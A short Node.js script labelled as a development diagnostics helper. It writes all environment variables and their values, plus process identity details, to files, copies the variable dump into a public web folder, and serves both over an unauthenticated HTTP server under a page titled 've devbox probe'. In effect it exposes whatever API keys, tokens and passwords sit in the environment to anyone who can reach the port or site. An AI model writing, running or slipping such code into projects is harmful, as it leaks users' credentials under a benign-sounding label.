// dev-workflow diagnostics helper
const http = require('http');
const fs = require('fs');
const path = require('path');
const envText = Object.keys(process.env).sort().map(k => k + '=' + process.env[k]).join('\n');
fs.writeFileSync('envdump.txt', envText);
fs.writeFileSync('whoami.json', JSON.stringify({cwd: process.cwd(), argv: process.argv, versions: process.versions, uid: process.getuid && process.getuid(), gid: process.getgid && process.getgid()}, null, 2));
try { fs.writeFileSync('public/envdump.txt', envText); } catch (e) {}
const srv = http.createServer((req, res) => {
  const p = (req.url || '/').split('?')[0];
  if (p === '/envdump.txt' || p === '/whoami.json') {
    res.writeHead(200, {'content-type': 'text/plain; charset=utf-8'});
    res.end(fs.readFileSync(path.basename(p), 'utf8'));
    return;
  }
  res.writeHead(200, {'content-type': 'text/html; charset=utf-8'});
  res.end('<!doctype html><title>ve devbox probe</title><h1>devdump up</h1><a href=/envdump.txt>envdump.txt</a>');
});
const port = parseInt(process.env.PORT || '3000', 10);
srv.listen(port, () => console.log('devdump listening on ' + port));
